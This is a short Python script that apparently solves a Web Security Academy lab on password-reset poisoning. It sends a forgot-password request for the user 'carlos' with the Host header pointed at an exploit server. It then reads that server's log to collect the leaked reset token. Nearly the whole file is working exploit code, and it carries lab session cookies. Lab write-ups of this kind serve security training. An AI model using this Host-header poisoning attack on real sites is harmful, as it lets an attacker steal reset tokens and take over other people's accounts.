#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

def get_csrf(url, endpoint_forgot_password, cookie):

    # Getting CSRF Token
    headers = {
        "Cookie" : cookie,
    }

    r = requests.get(url + endpoint_forgot_password, headers=headers)
    p = BeautifulSoup(r.content, "lxml")

    csrf = p.find(attrs = {'name' : 'csrf'})['value']

    return csrf

def forgot_password(url, url_exploit, endpoint_forgot_password, cookie):

    csrf = get_csrf(url, endpoint_forgot_password, cookie)

    headers = {
        "Host" : url_exploit,
        "Cookie" : cookie,
    }

    data = {
        "csrf" : csrf,
        "username" : "carlos",    
    }

    r = requests.post(url + endpoint_forgot_password, headers=headers, data=data)
    print(r.status_code)

def read_log(url_exploit, endpoint_log):

    r = requests.get("https://" + url_exploit + endpoint_log)
    print(r.text)


if __name__ == '__main__':
    url = "https://acf01f131ec49525c06c810d0090008f.web-security-academy.net"
    url_exploit = "exploit-acfd1fbb1ebe951fc0088114011000ca.web-security-academy.net"
    endpoint_forgot_password = "/forgot-password"
    endpoint_log = "/log"
    cookie = "_lab=47%7cMC0CFQCQnqHHZ7XqFTmrt6HwPWoHilOZBwIUT1N3bWxrqctijGMhNHWaQ7al"
    cookie+= "%2fXFcXesijwqM1bsb%2blyt1WwNlamzLE2saqrXNJrSESnmgUcYOgINY2IjSpp8x7PdOSgw5S7KZvof7GmEMK5GkaVThootrmiFVQwU85KKW2INWcJY4t%2f9; session=VuLVqjnuJt3WVrOjbczRwuIVvYdHMC7n"

    forgot_password(url, url_exploit, endpoint_forgot_password, cookie)
    read_log(url_exploit, endpoint_log)
    